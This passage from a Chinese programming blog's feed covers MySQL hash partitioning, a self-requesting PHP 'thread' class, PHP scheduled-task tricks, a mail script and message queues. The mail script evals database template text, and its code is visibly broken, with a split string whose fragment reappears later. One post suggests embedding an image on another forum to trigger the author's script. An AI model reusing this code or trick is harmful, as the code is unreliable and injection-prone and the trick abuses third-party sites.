class="line">)</span><br><span class="line"><span class="keyword">PARTITION</span> <span class="keyword">BY</span> <span class="keyword">HASH</span>(store_id)</span><br><span class="line"><span class="keyword">PARTITIONS</span> <span class="number">4</span>；</span><br></pre></td></tr></table></figure><p>如果没有包括一个PARTITIONS子句，那么分区的数量将默认为1。 例外： 对于NDB Cluster（簇）表，默认的分区数量将与簇数据节点的数量相同，这种修正可能是考虑任何MAX_ROWS 设置，以便确保所有的行都能合适地插入到分区中。（参见第17章：MySQL簇）。<br>如果在关键字“PARTITIONS”后面没有加上分区的数量，将会出现语法错误。<br>“expr”还可以是一个返回一个整数的SQL表达式。例如，也许你想基于雇用雇员的年份来进行分区。这可以通过下面的语句来实现：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> employees (</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    fname <span class="built_in">VARCHAR</span>(<span class="number">30</span>),</span><br><span class="line">    lname <span class="built_in">VARCHAR</span>(<span class="number">30</span>),</span><br><span class="line">    hired <span class="built_in">DATE</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'1970-01-01'</span>,</span><br><span class="line">    separated <span class="built_in">DATE</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'9999-12-31'</span>,</span><br><span class="line">    job_code <span class="built_in">INT</span>,</span><br><span class="line">    store_id <span class="built_in">INT</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">PARTITION</span> <span class="keyword">BY</span> <span class="keyword">HASH</span>(<span class="keyword">YEAR</span>(hired))</span><br><span class="line"><span class="keyword">PARTITIONS</span> <span class="number">4</span>；</span><br></pre></td></tr></table></figure><p>“expr”还可以是MySQL 中有效的任何函数或其他表达式，只要它们返回一个既非常数、也非随机数的整数。（换句话说，它既是变化的但又是确定的）。但是应当记住，每当插入或更新（或者可能删除）一行，这个表达式都要计算一次；这意味着非常复杂的表达式可能会引起性能问题，尤其是在执行同时影响大量行的运算（例如批量插入）的时候。<br>最有效率的哈希函数是只对单个表列进行计算，并且它的值随列值进行一致地增大或减小，因为这考虑了在分区范围上的“修剪”。也就是说，表达式值和它所基于的列的值变化越接近，MySQL就可以越有效地使用该表达式来进行HASH分区。<br>例如，“date_col” 是一个DATE（日期）类型的列，那么表达式TO_DAYS(date_col)就可以说是随列“date_col”值的变化而发生直接的变化，因为列“date_col”值的每个变化，表达式的值也将发生与之一致的变化。而表达式YEAR(date_col)的变化就没有表达式TO_DAYS(date_col)那么直接，因为不是列“date_col”每次可能的改变都能使表达式YEAR(date_col)发生同等的改变。即便如此，表达式YEAR(date_col)也还是一个用于 哈希函数的、好的候选表达式，因为它随列date_col的一部分发生直接变化，并且列date_col的变化不可能引起表达式YEAR(date_col)不成比例的变化。<br>作为对照，假定有一个类型为整型（INT）的、列名为“int_col”的列。现在考虑表达式“POW(5-int_col,3) + 6”。这对于哈希函数就是一个不好的选择，因为“int_col”值的变化并不能保证表达式产生成比例的变化。列 “int_col”的值发生一个给定数目的变化，可能会引起表达式的值产生一个很大不同的变化。例如，把列“int_col”的值从5变为6，表达式的值将产生“－1”的改变，但是把列“int_col”的值从6变为7时，表达式的值将产生“－7”的变化。<br>换句话说，如果列值与表达式值之比的曲线图越接近由等式“y=nx（其中n为非零的常数）描绘出的直线，则该表达式越适合于 哈希。这是因为，表达式的非线性越严重，分区中数据产生非均衡分布的趋势也将越严重。<br>理论上讲，对于涉及到多列的表达式，“修剪（pruning）”也是可能的，但是要确定哪些适于 哈希是非常困难和耗时的。基于这个原因，实际上不推荐使用涉及到多列的哈希表达式。<br>当使用了“PARTITION BY HASH”时，MySQL将基于用户函数结果的模数来确定使用哪个编号的分区。换句话，对于一个表达式“expr”，将要保存记录的分区编号为N ，其中“N = MOD(expr, num)”。例如，假定表t1 定义如下，它有4个分区：<br>CREATE TABLE t1 (col1 INT, col2 CHAR(5), col3 DATE)<br>    PARTITION BY HASH( YEAR(col3) )<br>    PARTITIONS 4；<br>如果插入一个col3列值为’2005-09-15’的记录到表t1中，那么保存该条记录的分区确定如下：<br>MOD(YEAR(‘2005-09-01’),4)<br>=  MOD(2005,4)<br>=  1<br>MySQL 5.1 还支持一个被称为“linear hashing（线性哈希功能）”的变量，它使用一个更加复杂的算法来确定新行插入到已经分区了的表中的位置。关于这种算法的描述，请参见18.2.3.1节，“LINEAR HASH分区” 。<br>每当插入或更新一条记录，用户函数都要计算一次。当删除记录时，用户函数也可能要进行计算，这取决于所处的环境。<br>注释：如果将要分区的表有一个唯一的键，那么用来作为HASH用户函数的自变数或者主键的column_list的自变数的任意列都必须是那个键的一部分。</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>php多线程</title>
      <link href="/2013/01/31/php/php%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
      <url>/2013/01/31/php/php%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p><code><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL &amp; ~E_NOTICE);</span><br><span class="line">/**</span><br><span class="line"> * @title:PHP多线程类(Thread)</span><br><span class="line"> * @version:1.0</span><br><span class="line"> * @author:phper.org.cn &lt; web@phper.org.cn &gt;</span><br><span class="line"> * @published:2010-11-2</span><br><span class="line"> * </span><br><span class="line"> * PHP多线程应用示例：</span><br><span class="line"> *  require_once <span class="string">'thread.class.php'</span>;</span><br><span class="line"> *  <span class="variable">$thread</span> = new thread();</span><br><span class="line"> *  <span class="variable">$thread</span>-&gt;addthread(<span class="string">'action_log'</span>,<span class="string">'a'</span>);</span><br><span class="line"> *  <span class="variable">$thread</span>-&gt;addthread(<span class="string">'action_log'</span>,<span class="string">'b'</span>);</span><br><span class="line"> *  <span class="variable">$thread</span>-&gt;addthread(<span class="string">'action_log'</span>,<span class="string">'c'</span>);</span><br><span class="line"> *  <span class="variable">$thread</span>-&gt;runthread();</span><br><span class="line"> *  </span><br><span class="line"> *  <span class="keyword">function</span> action_log(<span class="variable">$info</span>) &#123;</span><br><span class="line"> *  <span class="variable">$log</span> = <span class="string">'log/'</span> . microtime() . <span class="string">'.log'</span>;</span><br><span class="line"> *  <span class="variable">$txt</span> = <span class="variable">$info</span> . <span class="string">"\r\n\r\n"</span> . <span class="string">'Set in '</span> . Date(<span class="string">'h:i:s'</span>, time()) . (double)microtime() . <span class="string">"\r\n"</span>;</span><br><span class="line"> *  <span class="variable">$fp</span> = fopen(<span class="variable">$log</span>, <span class="string">'w'</span>);</span><br><span class="line"> *  fwrite(<span class="variable">$fp</span>, <span class="variable">$txt</span>);</span><br><span class="line"> *  fclose(<span class="variable">$fp</span>);</span><br><span class="line"> *  &#125;</span><br><span class="line"> */</span><br><span class="line">class thread &#123;</span><br><span class="line"></span><br><span class="line">    var <span class="variable">$hooks</span> = array();</span><br><span class="line">    var <span class="variable">$args</span> = array();</span><br><span class="line">    <span class="comment">#var $address='';</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">thread</span></span>() &#123;</span><br><span class="line"><span class="comment">#$this-&gt;address=$address;</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> addthread(<span class="variable">$func</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="variable">$args</span> = array_slice(func_get_args(), 1);</span><br><span class="line">    <span class="variable">$this</span>-&gt;hooks[] = <span class="variable">$func</span>;</span><br><span class="line"><span class="variable">$this</span>-&gt;args[] = <span class="variable">$args</span>;</span><br><span class="line"><span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> runthread()</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'flag'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="variable">$flag</span> = intval(<span class="variable">$_GET</span>[<span class="string">'flag'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flag</span> || <span class="variable">$flag</span> === 0)</span><br><span class="line">&#123;</span><br><span class="line">call_user_func_array(<span class="variable">$this</span>-&gt;hooks[<span class="variable">$flag</span>], <span class="variable">$this</span>-&gt;args[<span class="variable">$flag</span>]);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = 0, <span class="variable">$size</span> = count(<span class="variable">$this</span>-&gt;hooks); <span class="variable">$i</span> &lt; <span class="variable">$size</span>; <span class="variable">$i</span>++)</span><br><span class="line">        &#123;</span><br><span class="line">/*</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$this</span>-&gt;address)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$addr</span>=<span class="variable">$this</span>-&gt;address;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$addr</span>=<span class="variable">$_SERVER</span>[<span class="string">'HTTP_HOST'</span>];</span><br><span class="line">&#125;</span><br><span class="line">*/</span><br><span class="line">        <span class="variable">$fp</span>=fsockopen(<span class="variable">$_SERVER</span>[<span class="string">'HTTP_HOST'</span>],<span class="variable">$_SERVER</span>[<span class="string">'SERVER_PORT'</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$fp</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">"GET &#123;<span class="variable">$_SERVER</span>['PHP_SELF']&#125;?flag=<span class="variable">$i</span> HTTP/1.1\r\n"</span>;</span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">"Host: &#123;<span class="variable">$_SERVER</span>['HTTP_HOST']&#125;\r\n"</span>;</span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">"Connection: Close\r\n\r\n"</span>;</span><br><span class="line">fputs(<span class="variable">$fp</span>,<span class="variable">$out</span>);</span><br><span class="line">                fclose(<span class="variable">$fp</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>php定时执行任务的几个方法</title>
      <link href="/2013/01/23/php/php%E5%AE%9A%E6%97%B6%E6%89%A7%E8%A1%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%87%A0%E4%B8%AA%E6%96%B9%E6%B3%95/"/>
      <url>/2013/01/23/php/php%E5%AE%9A%E6%97%B6%E6%89%A7%E8%A1%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%87%A0%E4%B8%AA%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>PHP的实现决定了它没有Java和.Net这种AppServer的概念, 而http协议是一个无状态的协议, php只能被用户触发, 被调用, 调用后会自动退出内存, 没有常驻内存, 就没有办法准确的定时处理<br>那么, 如果需要用PHP定时执行某些任务的话, 可以有以下俩个方法:<br>Linux下crontab, windows下计划任务<br>找个被频繁调用的网页, 里面加上一个检测代码<br>set_time_limit(0);<br>ignore_user_abort(true);<br>死循环 第一个方法是最常见的, 如果php服务器上没有权限去crontab, 也可以找一个自己的机器定期crontab去请求服务器<br>第二种方法, 论坛上定时清理新帖基本上就是这么实现的, 如果人气不旺的话, 可以考虑去别的火爆点的论坛里面发个图片, 调用自己的php来实现一个trigger就好了。 Discuz!是判断在00:00之后,第一个执行者去执行的。<br>第三种比较不靠谱, Apache重启了就得重新访问,  fastcgi倒是会好一点。<br>下面的这段代码，可以在当前文件夹下，生成一个test.txt，并每隔20秒，往里面写入一个时间戳，无论客户端是否关闭浏览器。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">ignore_user_abort(<span class="keyword">true</span>);</span></span><br><span class="line"><span class="php">set_time_limit(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">write_txt</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!file_exists(”test.txt”))&#123;</span></span><br><span class="line"><span class="php">$fp = fopen(”test.txt”,”wb”);</span></span><br><span class="line"><span class="php">fclose($fp);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$str = file_get_contents(’test.txt’);</span></span><br><span class="line"><span class="php">$str .= “\r\n”.date(”H:i:s”);</span></span><br><span class="line"><span class="php">$fp = fopen(”test.txt”,”wb”);</span></span><br><span class="line"><span class="php">fwrite($fp,$str);</span></span><br><span class="line"><span class="php">fclose($fp);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">do_cron</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">usleep(<span class="number">20000000</span>);</span></span><br><span class="line"><span class="php">write_txt();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="php">do_cron();</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>关键的两个函数：<br>ignore_user_abort(true)，这个函数的作用是，无论客户端是否关闭浏览器，下面的代码都将得到执行。<br>set_time_limit(0)，这个函数的作用是，取消php文件的执行时间，如果没有这个函数的话，默认php的执行时间是30秒，也就是说30秒后，这个文件就say goodbay了。<br>另外usleep在PHP5.0之后，支持windows操作系统。<br>我们在做一个php 邮件发送问题是常常会遇见这样的问题，就是用户订阅一些资料需要定时发送到用户的邮箱中去。去网上搜索了一下，发现在这样的文章不多，本文介绍了一种用PHP实现的方法，笔者用PHP的时间不长，欢迎大家PP。</p><p>　　一、要实现定时发送，主要解决问题是定时。</p><p>　　我们在写程序时需要加个什么if 某个时间＝某个时间则发送，可是要实现这个过程，面临的问题是，我们要执行这个页面才能发送。所以主要解决的问题是怎么到时让服务器定时执行这个页面，这样实现起来好像比较困难。</p><p>　　二、我翻开PHP手册，找到了PHP 的命令行模式这一章，发现能解决这一问题，建议大家如果想用这个方法的话先看看这一章。<br>　三、解决方法：<br>1、在 Windows 平台下您可以将cli\php.exe 和 .php 文件的双击属性相关联，您也可以编写一个批处理文件来用 PHP 执行脚本。我们把写好的程序放在一个目录下如　E:\web\mail.php<br>然后写一个windows批处理文件内容如下。<br>@D:\php\cli\php.exe E:\web\mail.php &gt;d:\php\cli\sendmail.log<br>Pause<br>那个D:\php\cli\php.exe是我的PHP安装文件所在目录。Php.exe就是windows　PHP命令行模式的程序。<br>好的，我们保存这个文件为mail.bat然后的windows中的计划任务中添加一个任务，让操作系统在某个时间来运行这个批处理文件。<br>2、如果您使用 Unix 系统，您需要在您的 PHP 脚本的最前面加上一行特殊的代码，使得它能够被执行，这样系统就能知道用什么样的程序要运行该脚本。为 Unix 系统增加的第一行代码不会影响该脚本在 Windows 下的运行，因此您也可以用该方法编　　　写跨平台的脚本程序。以下是一个简单的PHP 命令行程序的范例。<br>　　四、例子：<br>E:\web \Timesend.php</p><p>#!/usr/bin/php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"E:\web\includes\config.php"</span>);            </span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"E:\web\includes\class\mail.class.php"</span>);</span><br><span class="line">       <span class="keyword">require_once</span>(<span class="string">"E:\web\includes\class\smtp.class.php"</span>);</span><br><span class="line">       <span class="comment">// +----------------------------------------------------+</span></span><br><span class="line"><span class="comment">//数据库配置</span></span><br><span class="line">    $dbhost = <span class="string">"localhost"</span>;</span><br><span class="line">    $dbport = <span class="string">"3306"</span>;</span><br><span class="line">    $dbname = <span class="string">""</span>;</span><br><span class="line">    $dbuser = <span class="string">""</span>;</span><br><span class="line">    $dbpawd = <span class="string">""</span>;</span><br><span class="line"><span class="comment">// +----------------------------------------------------+</span></span><br><span class="line"><span class="comment">//数据库连接对象</span></span><br><span class="line">    $db = <span class="keyword">new</span> dbLink($dbhost,$dbport,$dbuser,$dbpawd,$dbname);</span><br><span class="line">       $query = <span class="string">"SELECT * FROM wl_mailtemplate WHERE mt_name = 'UserUpdate'"</span>;</span><br><span class="line">       $mailtemplate =$db-&gt;dbQuery($query);</span><br><span class="line">       $username = <span class="string">'sdfsdfdsd'</span>;</span><br><span class="line">    $sex = <span class="string">"先生"</span>;</span><br><span class="line">       $accounts = <span class="string">"sdfasdfasdfsad"</span>;</span><br><span class="line">       $password = <span class="string">"sdfsadfsdasdasddssfds"</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">       $message = <span class="string">"</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">                                   $message = addslashes($message);</span></span><br><span class="line"><span class="string">                                   eval_r("</span>\$message = \<span class="string">"$message\";"</span>);</span><br><span class="line">                                   </span><br><span class="line">       $mail = <span class="keyword">new</span> SendMail(<span class="string">'wfits@126.com'</span>, $mailtemplate[<span class="number">0</span>][<span class="string">'mt_subject'</span>], nl2br($message));</span><br><span class="line">       <span class="keyword">if</span> ($mail-&gt;Send())</span><br><span class="line">       &#123;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">       $feedback = <span class="string">"修改确认信息已发送到您的注册Email，当前登录已被注销。\\n请注意查收确认信，并取得新的登录密码。"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $feedback;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>写个bat文件。<br>@D:\php\cli\php.exe E:\web\mail.php &gt;d:\php\cli\sendmail.log<br>Pause<br>保存为：timesend.bat放在@D:\php\cli\php.exe目录下<br>在window中添加计划任务，然后就可以啦！</p><p>　　五、说明。<br>　1、  我发送邮件用的是模板在数据库中存着，还有两个邮件发送类就不提供了，要的话可以联系我。<br>　2、  在使用requrie_once时要用绝对路径。<br>　3、  PHP 的命令行模式能使得 PHP 脚本能完全独立于 WEB 服务器单独运行，所以要是大量发送邮件时就能减轻服务器负担。<br>　4、  再一次建议大家看看PHP手册　第23. 章PHP 的命令行模式。<br>　<br>     其实这不是真正的实现邮件自动发送的方法，但是在无桌面应用程序中的ＷＥＢ方式下，这可能是一个比较好的方式吧～！，我想那种真正实现邮件自动发送的系统，在服务器端还是有一个桌面应用程序做支撑的！所以说这种实现邮件的自动发送仅仅是实现ＰＨＰ程序发送邮件的一种方法！</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line">" . $mailtemplate[0]['mt_message']. "</span><br><span class="line">";</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">ignore_user_abort();           <span class="comment">// 即使Client断开(如关掉浏览器)，PHP脚本也可以继续执行.</span></span></span><br><span class="line"><span class="php">set_time_limit(<span class="number">0</span>);             <span class="comment">// 执行时间为无限制，php默认的执行时间是30秒，通过set_time_limit(0)可以让程序无限制的执行下去</span></span></span><br><span class="line"><span class="php">$interval=<span class="number">20</span>;               <span class="comment">// 时间间隔 单位 秒</span></span></span><br><span class="line"><span class="php">$key_file=<span class="string">"key.txt"</span>;          <span class="comment">// 配置文件</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'s'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">if</span> ($_GET[<span class="string">'s'</span>]==<span class="string">"0"</span>)&#123;        <span class="comment">// 停止工作，但不退出</span></span></span><br><span class="line"><span class="php">    $s=<span class="string">"false"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Function is off"</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="keyword">elseif</span> ($_GET[<span class="string">'s'</span>]==<span class="string">"1"</span>)&#123;      <span class="comment">// 工作</span></span></span><br><span class="line"><span class="php">    $s=<span class="string">"true"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Function is on"</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="keyword">elseif</span> ($_GET[<span class="string">'s'</span>]==<span class="string">"2"</span>)&#123;      <span class="comment">// 退出</span></span></span><br><span class="line"><span class="php">    $s=<span class="string">"die"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Function exited"</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="keyword">else</span></span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"Err 0:stop working 1:working 2:exit"</span>);</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">  $string = <span class="string">"&lt;?php\n return \""</span>.$s.<span class="string">"\";\n?&gt;"</span>;</span></span><br><span class="line"><span class="php">  write_inc($key_file,$string,<span class="keyword">true</span>);</span></span><br><span class="line"><span class="php">  <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(file_exists($key_file))&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">do</span>&#123;</span></span><br><span class="line"><span class="php">    $mkey = <span class="keyword">include</span> $key_file;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($mkey==<span class="string">"true"</span>)&#123;          <span class="comment">// 如果工作</span></span></span><br><span class="line"><span class="php">    <span class="comment">/////////////////////  工作区间  //////////////////////////////////</span></span></span><br><span class="line"><span class="php">      $showtime=date(<span class="string">"Y-m-d H:i:s"</span>);</span></span><br><span class="line"><span class="php">      $fp = fopen(<span class="string">'func.txt'</span>,<span class="string">'a'</span>);</span></span><br><span class="line"><span class="php">      fwrite($fp,$showtime.<span class="string">"\n"</span>);</span></span><br><span class="line"><span class="php">      fclose($fp);</span></span><br><span class="line"><span class="php">    <span class="comment">///////////////////////////////////////////////////////////////////</span></span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">elseif</span> ($mkey==<span class="string">"die"</span>)&#123;        <span class="comment">// 如果退出</span></span></span><br><span class="line"><span class="php">      <span class="keyword">die</span>(<span class="string">"I am dying!"</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    sleep($interval);           <span class="comment">// 等待$interval分钟</span></span></span><br><span class="line"><span class="php">  &#125;<span class="keyword">while</span>(<span class="keyword">true</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">  <span class="keyword">die</span>($key_file.<span class="string">" doesn't exist !"</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">write_inc</span><span class="params">($path,$strings,$type=false)</span></span></span></span><br><span class="line"><span class="php">&#123;  </span></span><br><span class="line"><span class="php">  $path=dirname(<span class="keyword">__FILE__</span>).<span class="string">"/"</span>.$path;</span></span><br><span class="line"><span class="php">  <span class="keyword">if</span> ($type==<span class="keyword">false</span>)</span></span><br><span class="line"><span class="php">    file_put_contents($path,$strings,FILE_APPEND);</span></span><br><span class="line"><span class="php">  <span class="keyword">else</span></span></span><br><span class="line"><span class="php">    file_put_contents($path,$strings);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>原文:<a href="http://blbear.com/post/187" target="_blank" rel="noopener">http://blbear.com/post/187</a></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>php消息队列</title>
      <link href="/2013/01/23/php/php%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/"/>
      <url>/2013/01/23/php/php%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/</url>
      
        <content type="html"><![CDATA[<p>首先既然是队列当然满足FIFO的性质。称它为消息队列是因为它是在多个进程中共享消息的机制。当然System V下还有信号量和共享内存等机制来完成进程间内容的共享。但是队列这个结构的性质非常适合完成系列连贯的任务，而且任务处理又有先后顺序的情形。<br>PHP中用于消息队列的函数如下：</p><figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> ftok ( <span class="keyword">string</span> $pathname , <span class="keyword">string</span> $proj ) <span class="comment">//负责创建消息队列的key</span></span><br><span class="line">resource msg_get_queue ( <span class="keyword">int</span> $key [, <span class="keyword">int</span> $perms ] ) <span class="comment">//通过key来创建消息队列</span></span><br><span class="line">bool msg_queue_exists ( <span class="keyword">int</span> $key ) <span class="comment">//判断队列是否存在</span></span><br><span class="line">bool msg_remove_queue ( resource $queue ) <span class="comment">//删除消息队列</span></span><br><span class="line">array msg_stat_queue ( resource $queue ) <span class="comment">//获得队列状态信息，包括队列中还有多少消息未读等信息。</span></span><br><span class="line">bool msg_send ( resource $queue , <span class="keyword">int</span> $msgtype , mixed $message [, bool $serialize [, bool $blocking [, <span class="keyword">int</span> &amp;$errorcode ]]] ) <span class="comment">//发送消息至消息队列</span></span><br><span class="line">bool msg_receive ( resource $queue , <span class="keyword">int</span> $desiredmsgtype , <span class="keyword">int</span> &amp;$msgtype , <span class="keyword">int</span> $maxsize , mixed &amp;$message [, bool $unserialize [, <span class="keyword">int</span> $flags [, <span class="keyword">int</span> &amp;$errorcode ]]] ) <span class="comment">//从消息队列中获取消息</span></span><br></pre></td></tr></table></figure><p>下面我来具体说说msg_send和msg_receive，因为其他的函数使用起来都比较简单，看一下文档就可以了。<br>msg_send在发送消息的时候可以指定可以msgtype的参数，这个参数是用来指定消息类型的，参数类型为数字型。使用这个参数我们可以在同一个消息队列中放置不同类型的消息，从而不必开辟多个消息队列。serialize参数来指定是否需要将消息变量进行序列化，序列化后我们就可以存放结构更为复杂的变量。而blocking参数用来指定在队列满后msg_send的动作，当blocking为true时，msg_send会挂起，等待消息队列中有足够的空间放置消息时再次发送消息。而如果blocking为false则在发现队列满后不执行send直接结束。<br>msg_receive可以指定你需要从队列中取回的消息类型,即desiremsgtype，它会从队列中取出第一个满足此类型的消息。如果desiremsgtype为0，则不考虑类型，取出消息队列的第一个元素。它的值也可以为负值，此时返回的数据类型为小于此负值绝对值的最小值。例如你指定-5为希望的类型，那么如果有类型为1的消息则优先返回。若队列中没有符合的类型可以返回的话，此函数挂起等待相应类型加入队列后将其取出，若flag中有MSG_IPC_NOWAIT的话则立即返回。msgtype为一个引用传递参数，获取实际获得的消息类型。maxsize指定消息的最大长度，若消息长度超过最大长度则产生错误，若指定flag为MSG_NOERROR则消息会根据最大长度截取，并抑制错误的产生。unserialize用来指定是否需要解序列化。flag中还有一个标记是MSG_EXCEPT，通过配合desiremsgtype可以实现选择不是某种类型的消息。<br>下面我们讨论如何通过消息队列实现PHP的多进程。<br>因为消息队列是系统的公共存储空间，因此所有的php进程都可以访问。最简单的实现方法就是通过一个php将要处理的任务发送到消息队列中，然后通过开启子进程或者开启其他的php脚本来从消息队列中取出任务进行执行。<br>开启进程的方法有好多，可以使用pcntl_fork来创建一个子进程，也可以再找一个php脚本来处理，通过pcntl_exec来启动。或者根本不管进程空间，直接exec()来开启一个php脚本来处理。<br>我使用的方法是通过计数来开启其他php脚本处理。通过一个php取出要处理的任务，将其压入消息队列，每压入指定条数的消息就开启另一个php来处理消息队列的内容，直到所有要处理的任务都压入消息队列，主php结束执行。此时后台会有好多php脚本在执行消息队列中的任务，当消息队列为空则通过开启的php脚本将消息队列撤销，同时所有开启的php脚本结束。整个执行过程完成。<br>当然我们也可以通过pcntl_fork函数将程序写的更简单一些，在主进程中将任务入队，每隔一定的任务数开启一个当前进程的子进程来处理入队的任务，直到消息队列为空时结束。</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>php中对共享内存，消息队列的操作</title>
      <link href="/2013/01/16/php/php%E4%B8%AD%E5%AF%B9%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98%EF%BC%8C%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E7%9A%84%E6%93%8D%E4%BD%9C/"/>
      <url>/2013/01/16/php/php%E4%B8%AD%E5%AF%B9%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98%EF%BC%8C%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E7%9A%84%E6%93%8D%E4%BD%9C/</url>
      
